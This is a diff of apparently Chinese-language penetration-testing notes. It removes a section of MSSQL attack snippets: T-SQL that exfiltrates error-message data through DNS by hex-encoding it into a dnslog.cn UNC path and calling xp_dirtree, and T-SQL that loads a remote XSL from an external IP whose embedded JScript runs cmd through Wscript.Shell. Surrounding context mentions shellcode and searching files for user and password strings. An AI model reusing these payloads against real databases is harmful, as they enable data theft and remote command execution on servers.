@@ -207,58 +207,7 @@ shellcode:
           ret
 ```
 
-tips mssql反弹命令：  
-```
-BEGIN TRY
-   exec sp_configure 'show advanced options',1
-   reconfigure
-END TRY
-BEGIN CATCH
-  declare @d varchar(8000)
-  set @d = master.dbo.fn_varbintohexstr(convert(varbinary(max), substring(ERROR_MESSAGE(),1,10)))
-  set @d='\\'+@d+'.19c.dnslog.cn\a'
-  select @d
-  exec xp_dirtree @d,1,1
-  waitfor delay '00:00:03'
-END CATCH
 
-
-
-
-再给大家分享一个代码
-declare @o int, @hr int, @str varchar(8000), @url varchar(2000)
-set @url = 'http://1.1.75.0:443/2.xsl?' + convert(varchar, getdate(), 14) 
-exec sp_oacreate 'msxml2.domdocument', @o out
-exec sp_oasetproperty @o, 'async', false
-exec sp_oamethod @o, 'load', @hr out, @url
-exec sp_oamethod @o, 'transformNode', @str out, @o
-exec sp_OADestroy @o
-select @str
-
-<xsl:stylesheet
-xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-xmlns:user="http://mycompany.com/mynamespace"
-xmlns:msxsl="urn:schemas-microsoft-com:xslt" version="1.0">
-<xsl:output method="text" encoding="UTF-8" />
-<xsl:template match="/">
-	<xsl:value-of select="user:run()"/>
-</xsl:template>
-<msxsl:script language="javascript" implements-prefix="user">
-function run () {
-	try {
-		var shell = new ActiveXObject('Wscript.Shell');
-		return shell.exec('cmd /c ver').StdOut.ReadAll();	
-	}
-	catch(e) {
-		return e.description;
-	}
-}
-</msxsl:script>
-</xsl:stylesheet>
-
-sp_MSforeachtable和sp_MSforeachdb
-
-```
 
 ```
 #查找所有带user和pass的txt
